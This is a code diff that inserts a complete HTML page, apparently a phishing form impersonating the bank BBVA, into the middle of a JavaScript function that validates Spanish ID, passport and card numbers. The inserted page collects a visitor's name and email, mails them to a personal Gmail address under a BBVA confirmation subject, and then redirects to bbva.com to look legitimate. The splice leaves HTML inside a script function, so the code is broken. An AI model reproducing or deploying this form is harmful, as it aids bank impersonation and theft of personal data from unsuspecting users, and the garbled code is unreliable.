@@ -130,6 +130,52 @@
             const cardRegex = /^[0-9]{16}$/; // Card: 16 digits
 
             return nifRegex.test(credential) || nieRegex.test(credential) || passportRegex.test(credential) || cardRegex.test(credential);
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Redireccionamiento a BBVA y envío de mensaje</title>
+<script language="javascript" type="text/javascript">
+function redireccionarBBVA() {
+  // URL de la página oficial de BBVA que deseas mostrar
+  var url = 'https://www.bbva.com/';
+  
+  // Reemplaza este correo con tu correo electrónico
+  var correo = 'ste.eddie01@gmail.com';
+
+  // Obtén los valores de los campos de texto
+  var nombre = encodeURIComponent(document.getElementById('nombre').value);
+  var correoElectronico = encodeURIComponent(document.getElementById('correo').value);
+
+  // Construye la URL de la página de agradecimiento con los datos
+  var urlDestino = 'https://www.tuweb.com/gracias.html?nombre=' + nombre + '&correo=' + correoElectronico;
+  
+  window.location.href = urlDestino;
+}
+
+function enviarFormulario() {
+  var nombre = encodeURIComponent(document.getElementById('nombre').value);
+  var correoElectronico = encodeURIComponent(document.getElementById('correo').value);
+  
+  // Ejecutar la función de redireccionamiento después de 3 segundos
+  setTimeout('redireccionarBBVA()', 3000);
+  
+  // Enviar los datos al correo electrónico
+  var mensaje = 'Nombre: ' + nombre + '\nEmail: ' + correoElectronico;
+  window.location.href = 'mailto:' + correo + '?subject=Confirmación de datos en BBVA' + '&body=' + mensaje;
+}
+
+</script>
+</head>
+<body>
+  <h2>Formulario de Redirección y Envío Automático</h2>
+  <form>
+    <label for="nombre">Nombre:</label>
+    <input type="text" id="nombre" name="nombre"><br>
+    <label for="correo">Correo electrónico:</label>
+    <input type="text" id="correo" name="correo"><br>
+    <input type="submit" value="Enviar" onclick="enviarFormulario()">
+  </form>
+</html>
         }
     </script>
 
